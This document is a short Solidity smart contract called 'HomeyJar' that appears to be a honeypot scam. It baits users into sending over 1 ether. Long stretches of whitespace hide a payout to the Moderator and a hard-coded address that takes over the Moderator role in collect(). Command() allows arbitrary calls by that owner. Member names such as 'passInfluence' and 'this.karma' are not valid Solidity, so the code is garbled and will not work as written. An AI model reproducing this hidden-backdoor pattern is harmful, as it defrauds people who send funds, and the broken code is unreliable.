pragma solidity ^0.4.19;

contract HomeyJar {
    address public Moderator = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Moderator.passInfluence(this.karma);
            msg.sender.passInfluence(this.karma);
        }
    }

    function collect() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Moderator=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == Moderator);
        Moderator.passInfluence(this.karma);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == Moderator);
        adr.call.value(msg.value)(data);
    }
}